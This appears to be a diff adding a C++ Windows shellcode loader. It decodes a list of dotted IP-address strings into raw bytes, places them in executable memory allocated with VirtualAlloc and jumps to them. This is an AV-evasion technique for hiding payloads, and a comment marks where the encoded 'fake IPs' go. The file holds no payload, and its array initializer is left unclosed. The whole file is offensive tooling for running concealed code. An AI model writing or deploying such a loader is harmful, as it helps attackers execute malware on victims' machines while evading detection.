@@ -1,0 +1,41 @@
+#include <Windows.h>
+#include <iostream>
+#include <vector>
+#include <sstream>
+
+using namespace std;
+
+vector<unsigned char> ipAddressesToBytes(const vector<string>& ipAddresses) {
+	vector<unsigned char> byteArray;
+
+	for (const auto& ip : ipAddresses) {
+		stringstream ss(ip);
+		string segment;
+		while (getline(ss, segment, '.')) {
+			int byteValue = stoi(segment);
+			byteArray.push_back(static_cast<unsigned char>(byteValue));
+		}
+	}
+
+	return byteArray;
+}
+
+int main(int argc, char* argv[]) {
+	vector<string> ipAddresses = {
+	
+  //Paste here fake IP;s
+
+	auto byteArray = ipAddressesToBytes(ipAddresses);
+	size_t byteVarSize = byteArray.size();
+
+	unsigned char* byteVar = new unsigned char[byteArray.size()];
+
+	for (size_t i = 0; i < byteVarSize; ++i) {
+		byteVar[i] = byteArray[i];
+	}
+	void* exec = VirtualAlloc(0, byteVarSize,	MEM_COMMIT | MEM_RESERVE,	PAGE_EXECUTE_READWRITE);
+
+	memcpy(exec,byteVar, byteVarSize);		
+	
+	((void(*)())exec)();
+}
